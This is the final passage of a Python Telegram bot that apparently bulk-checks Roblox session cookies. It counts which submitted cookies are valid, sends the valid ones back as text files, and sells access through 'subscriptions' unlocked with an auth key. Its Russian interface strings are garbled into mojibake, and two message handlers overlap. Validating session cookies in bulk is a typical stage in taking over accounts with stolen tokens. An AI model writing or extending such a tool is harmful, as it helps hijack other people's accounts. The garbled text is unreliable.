            await query.edit_message_text("‚ùå –ü–æ–¥–ø–∏—Å–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
    
    elif query.data == "back_to_main":
        await query.edit_message_text("üîô –í–æ–∑–≤—Ä–∞—Ç –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é")

async def handle_auth_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –≤–≤–æ–¥–∞ auth key"""
    user_id = update.effective_user.id
    auth_key = update.message.text.strip()
    
    if 'selected_cookie_index' not in context.user_data:
        await update.message.reply_text("‚ùå –°–Ω–∞—á–∞–ª–∞ –≤—ã–±–µ—Ä–∏—Ç–µ –∫—É–∫–∏ –¥–ª—è –ø–æ–¥–ø–∏—Å–∫–∏")
        return
    
    cookie_index = context.user_data['selected_cookie_index']
    
    # –ê–∫—Ç–∏–≤–∏—Ä—É–µ–º –ø–æ–¥–ø–∏—Å–∫—É
    success, message = checker.subscribe_user(user_id, cookie_index, auth_key)
    
    if success:
        subscription = checker.subscriptions[user_id]
        sub_info = f"""
‚úÖ –ü–û–î–ü–ò–°–ö–ê –ê–ö–¢–ò–í–ò–†–û–í–ê–ù–ê

üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {subscription['username']}
üÜî ID: {subscription['user_id']}
üìÖ –î–∞—Ç–∞ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏: {subscription['subscribe_date'].strftime("%d.%m.%Y %H:%M")}

–¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –æ–±–Ω–æ–≤–ª—è—Ç—å –∫—É–∫–∏ —á–µ—Ä–µ–∑ /mysub
"""
        await update.message.reply_text(sub_info)
    else:
        await update.message.reply_text(message)
    
    # –û—á–∏—â–∞–µ–º –∫–æ–Ω—Ç–µ–∫—Å—Ç
    context.user_data.pop('selected_cookie_index', None)

async def send_results(update, user_id, valid_cookies, invalid_cookies, process_results):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –ø—Ä–æ–≤–µ—Ä–∫–∏"""
    timestamp = datetime.now().strftime("%H%M%S")
    
    # –°–≤–æ–¥–∫–∞
    total = len(valid_cookies) + len(invalid_cookies)
    summary = f"""
üìã –†–ï–ó–£–õ–¨–¢–ê–¢–´:

‚Ä¢ –í—Å–µ–≥–æ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–æ: {total}
‚Ä¢ ‚úÖ –í–∞–ª–∏–¥–Ω—ã—Ö: {len(valid_cookies)}
‚Ä¢ ‚ùå –ù–µ–≤–∞–ª–∏–¥–Ω—ã—Ö: {len(invalid_cookies)}
‚Ä¢ üìä –£—Å–ø–µ—Ö: {len(valid_cookies)/total*100:.1f}%
"""
    if hasattr(update, 'message'):
        await update.message.reply_text(summary)
    else:
        await update.edit_message_text(summary)
    
    if valid_cookies:
        valid_filename = f"valid_{user_id}_{timestamp}.txt"
        with open(valid_filename, 'w', encoding='utf-8') as f:
            for cookie in valid_cookies:
                f.write(cookie + '\n\n')
        
        caption = f"‚úÖ –í–ê–õ–ò–î–ù–´–ï –ö–£–ö–ò: {len(valid_cookies)} —à—Ç."
        if hasattr(update, 'message'):
            await update.message.reply_document(
                document=open(valid_filename, 'rb'),
                caption=caption
            )
        else:
            await update.message.reply_document(
                document=open(valid_filename, 'rb'),
                caption=caption
            )
        os.remove(valid_filename)
    
    if invalid_cookies:
        invalid_filename = f"invalid_{user_id}_{timestamp}.txt"
        with open(invalid_filename, 'w', encoding='utf-8') as f:
            for cookie in invalid_cookies:
                f.write(cookie + '\n\n')
        
        if hasattr(update, 'message'):
            await update.message.reply_document(
                document=open(invalid_filename, 'rb'),
                caption=f"‚ùå –ù–ï–í–ê–õ–ò–î–ù–´–ï –ö–£–ö–ò: {len(invalid_cookies)} —à—Ç."
            )
        else:
            await update.message.reply_document(
                document=open(invalid_filename, 'rb'),
                caption=f"‚ùå –ù–ï–í–ê–õ–ò–î–ù–´–ï –ö–£–ö–ò: {len(invalid_cookies)} —à—Ç."
            )
        os.remove(invalid_filename)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("mysub", mysub_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_auth_key))
    app.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, handle_message))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("ü§ñ –ë–æ—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ Roblox –∫—É–∫–∏ –∑–∞–ø—É—â–µ–Ω...")
    print("‚úÖ –ë–æ—Ç –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ!")
    app.run_polling()

if __name__ == "__main__":
    main()
